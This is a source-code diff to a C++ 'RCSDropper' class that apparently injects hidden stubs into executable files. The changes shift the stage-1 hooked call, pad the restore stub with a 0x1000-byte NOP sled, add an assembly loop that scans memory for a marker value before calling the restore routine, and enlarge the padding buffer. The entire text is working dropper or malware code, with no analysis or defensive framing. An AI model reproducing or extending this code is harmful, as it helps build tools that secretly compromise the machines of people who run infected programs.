@@ -46,7 +46,7 @@ void RCSDropper::patchStage1(char* ptr, DWORD VA, DWORD stubVA)
             DWORD codeVA = stubVA + sizeof(DWORD);
             DWORD addr = (DWORD) ptr + codeVA - (DWORD)hookedInstruction_.d.VirtualAddr;
             std::cout << "Stage1 stub: call 0x" << hex << codeVA << dec << std::endl;
-            stub.call( (void*) addr );
+            stub.call( (void*) (addr + 0x1000));
         }
         break;
         case CallType:
@@ -93,13 +93,25 @@ std::size_t RCSDropper::restoreStub(DWORD currentVA) {
     DWORD restoreVA = currentVA + sizeof(DWORD);
     
     AsmJit::Assembler stub;
+    AsmJit::Label *start_loop = stub.newLabel();
     stub.data(&restoreVA, sizeof(DWORD));
-    stub.nop();
+    for (unsigned int i=0; i<0x1000; i++)
+    	    stub.nop();
     stub.pushfd();
     stub.nop();
     stub.pushad();
     stub.nop();
     stub.push(headerVA);
+
+    stub.pop(AsmJit::eax);
+stub.bind(start_loop);
+    stub.inc(AsmJit::eax);
+    stub.mov(AsmJit::ebx, AsmJit::dword_ptr(AsmJit::eax));
+    stub.inc(AsmJit::ebx);
+    stub.cmp(AsmJit::ebx, 0x2e312e32);
+    stub.jne(start_loop);
+    stub.push(AsmJit::eax);
+
     stub.nop();
     stub.call(((DWORD) restore) + (dropperVA - currentVA));
     stub.nop();
@@ -112,6 +124,9 @@ std::size_t RCSDropper::restoreStub(DWORD currentVA) {
     stub.ret();
     
     stub.relocCode((void*) restore);
+
+    if (currentVA == 0)
+	return stub.codeSize() + 3;
 
     return stub.codeSize();
 }
@@ -184,7 +199,7 @@ RCSDropper::RCSDropper(const char* filepath) {
         throw std::runtime_error(filepath);
 
     std::size_t fileSize = bf::file_size(filepath);
-    size_ = fileSize + 2048;
+    size_ = fileSize + 8192;
 
     // create buffer and zero it out
     data_.insert(data_.begin(), size_, 0);
